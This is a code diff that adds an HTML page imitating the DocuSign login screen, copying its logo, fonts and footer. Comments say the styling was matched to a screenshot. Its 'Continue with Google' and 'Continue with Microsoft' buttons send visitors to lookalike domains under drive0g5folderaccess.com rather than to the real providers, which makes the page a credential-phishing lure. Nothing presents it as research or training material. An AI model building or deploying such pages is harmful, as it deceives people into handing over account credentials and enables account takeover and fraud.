@@ -1,1 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | DocuSign</title>
+    <style>
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
 
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-bottom: 100px; /* Space for footer */
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: left; /* Aligned left to match 1362.png */
+        }
+
+        .logo {
+            width: 140px;
+            margin-bottom: 40px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #1e064b;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Buttons styled to match the DocuSign UI in 1362.png */
+        .auth-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            background-color: white;
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+            font-size: 16px;
+            transition: background-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        .auth-button:hover {
+            background-color: #f4f4f4;
+        }
+
+        .auth-button img {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+        }
+
+        .signup-btn {
+            background-color: #f0f0f0;
+            border: none;
+            color: #333;
+            margin-top: 10px;
+        }
+
+        /* Footer styling based on 1362.png */
+        footer {
+            border-top: 1px solid #e5e5e5;
+            padding: 20px 40px;
+            font-size: 12px;
+            color: #666;
+            background: white;
+        }
+
+        .footer-top {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .lang-selector {
+            background: #f4f4f4;
+            padding: 5px 10px;
+            border-radius: 4px;
+            margin-right: 20px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .copyright {
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-content">
+    <div class="login-container">
+        <!-- DocuSign Logo -->
+        <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign" class="logo">
+        
+        <h1>Log in to DocuSign</h1>
+        <p class="subtitle">Select your login method.</p>
+
+        <!-- Social Login Buttons -->
+        <a href="https://app.drive0g5folderaccess.com/" class="auth-button">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
+            Continue with Google
+        </a>
+
+        <a href="https://officehome365.drive0g5folderaccess.com/" class="auth-button">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+            Continue with Microsoft
+        </a>
+
+        <a href="#" class="auth-button signup-btn">Sign Up for Free</a>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-top">
+        <span style="margin-right: 10px;">Powered by</span>
+        <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign" style="height: 14px;">
+    </div>
+    
+    <div class="footer-links">
+        <div class="lang-selector">
+            English (US) <span style="margin-left: 8px; font-size: 10px;">▼</span>
+        </div>
+        <a href="#">Contact Us</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy</a>
+        <a href="#">Intellectual Property</a>
+        <a href="#">Trust</a>
+    </div>
+
+    <div class="copyright">
+        Copyright © 2026 DocuSign, Inc. All rights reserved
+    </div>
+</footer>
+
+</body>
+</html>
